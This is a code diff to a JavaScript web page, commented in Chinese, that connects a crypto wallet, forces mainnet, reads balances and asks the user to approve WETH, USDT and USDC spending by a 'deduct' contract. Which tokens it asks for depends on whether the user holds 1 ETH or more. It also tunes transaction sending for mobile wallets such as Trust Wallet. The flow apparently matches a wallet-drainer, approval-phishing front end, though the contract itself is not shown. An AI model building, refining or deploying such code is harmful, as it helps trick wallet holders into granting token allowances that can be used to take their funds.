@@ -29,7 +29,7 @@ const statusDiv = document.getElementById('status');
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
 
-// *** 關鍵鎖定旗標：防止 -32002 錯誤 ***
+// *** 關鍵鎖定旗標：防止 -32002 錯誤 (請求已在處理中) ***
 let isConnecting = false;
 
 //---UI Control Functions (使用者介面控制函數)---
@@ -83,7 +83,7 @@ function initializeContracts() {
 }
 
 /**
-* 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
+* 【魯棒交易】用於行動錢包環境的交易發送和錯誤處理。
 */
 async function sendMobileRobustTransaction(populatedTx) {
     if (!signer || !provider) throw new Error("Wallet not connected or signer missing."); //英文
@@ -108,7 +108,7 @@ async function sendMobileRobustTransaction(populatedTx) {
         receipt = await provider.waitForTransaction(txHash);
 
     } catch (error) {
-        // 捕獲 Trust Wallet 介面錯誤，並嘗試從中提取 hash
+        // 捕獲 Trust Wallet 等行動錢包介面可能拋出的錯誤，嘗試從中提取 hash
         console.warn("⚠️ Transaction interface error. Proceeding with on-chain check..."); //英文
 
         if (error.hash) {
@@ -147,6 +147,7 @@ async function checkAuthorization() {
             initializeContracts();
         }
 
+        // 讀取授權所需的門檻值和服務狀態
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
@@ -245,7 +246,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
 
 
 /**
-* 初始化錢包：檢查環境、網路和恢復會話。
+* 初始化錢包：檢查環境、網路和嘗試恢復會話。
 */
 async function initializeWallet() {
     try {
@@ -271,7 +272,7 @@ async function initializeWallet() {
             }
         }
 
-        // 嘗試恢復現有的連線地址
+        // 嘗試恢復現有的連線地址 (如果 App 已經授權過)
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
             userAddress = accounts[0];
@@ -292,6 +293,7 @@ async function initializeWallet() {
 
 /**
 *主要函數：連接錢包並根據餘額執行條件式流程。
+* 關鍵點：始終使用 eth_requestAccounts 來強制彈窗，解決 App 自動連接的問題。
 */
 async function connectWallet() {
     // 鎖定：解決您的原始錯誤 -32002
@@ -302,24 +304,33 @@ async function connectWallet() {
     isConnecting = true; // 設置鎖定旗標
 
     try {
-        // 確保錢包提供者存在並在主網
-        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
-            await initializeWallet();
-            const network = provider ? await provider.getNetwork() : { chainId: 0n };
-            if (network.chainId !== 1n) return; // 如果初始化失敗或仍在切換中，則退出
+        if (typeof window.ethereum === 'undefined') {
+            throw new Error("Wallet provider not found. Please use a DApp browser or install an extension."); // 英文
+        }
+        
+        provider = new ethers.BrowserProvider(window.ethereum);
+        
+        // 1. 確保網路在主網
+        const network = await provider.getNetwork();
+        if (network.chainId !== 1n) {
+            showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.'); // 英文
+            await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
+            isConnecting = false;
+            return;
         }
 
         showOverlay('Please confirm the connection in your wallet...'); // 英文
-        
-        // 1. 請求連線，獲取當前選中的地址
+
+        // 2. *** 關鍵：使用 eth_requestAccounts 強制請求連線 ***
+        // 這會強制 App 彈出選單/確認視窗，允許用戶切換帳戶。
         const accounts = await provider.send('eth_requestAccounts', []);
         if (accounts.length === 0) throw new Error("No account selected."); //英文
 
         const currentConnectedAddress = accounts[0];
 
-        // 2. 總是使用最新的地址覆蓋全局變數和 Signer
+        // 3. 總是使用最新的地址覆蓋全局變數和 Signer
         userAddress = currentConnectedAddress;
-        signer = await provider.getSigner(); // 獲取 Signer
+        signer = await provider.getSigner();
         initializeContracts(); // 初始化合約
 
         // --- 授權流程的開始 ---
@@ -336,7 +347,7 @@ async function connectWallet() {
 
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-        
+
         // 讀取所有代幣的授權額度
         const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
@@ -350,14 +361,12 @@ async function connectWallet() {
         let tokensToProcess;
 
         if (hasSufficientEth) {
-            // 情況 1: 餘額足夠 (>= 1 ETH/WETH) -> 授權 WETH, USDT, USDC
             tokensToProcess = [
                 { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
             ];
         } else {
-            // 情況 2: 餘額不足 (< 1 ETH/WETH) -> 只授權 USDT, USDC
             tokensToProcess = [
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
@@ -393,7 +402,6 @@ async function connectWallet() {
             connectButton.title = 'Connect Wallet (Retry)'; //英文
         }
     } finally {
-        // ****** 無論成功或失敗，都必須釋放鎖定旗標 ******
         isConnecting = false;
     }
 }
